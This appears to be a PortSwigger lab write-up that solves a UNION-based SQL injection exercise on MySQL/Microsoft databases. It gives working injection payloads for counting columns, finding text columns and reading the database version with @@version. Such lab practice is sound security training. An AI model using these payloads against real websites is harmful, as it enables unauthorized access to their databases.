## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7678b30ce35236ec7465262923f602556f84c9ab/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Lab%20Description.png)

We find a message delivered during lab practice displayed as garbled text on the webpage.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/9f06d81ac03d3fcb827eb0bb22b467358ee033f7/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Garbled%20Text.png)

## Solution :

> NOTE - Since it is either microsoft or MYQL db use **#** as comment 

#### Determine no of columns -

**ORDER BY 3** gives error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 #
```

![image]()

#### Determine column which has text data -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' #
```

Both the columns have text data since both returns the same i/p value.

![image]()

#### Retreive db version 

The syntax to find version info of both MYSQL & Microsoft db are the same - `@@version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT @@version,NULL #
```
![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0b6c732028265d887a3d270b23bb24ee1dd1cf1a/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Solution%20on%20BurpSuite.png)

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/fba74303ae81bb6123d3060c79d0bddae0c99593/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Lab%20Solution.png)

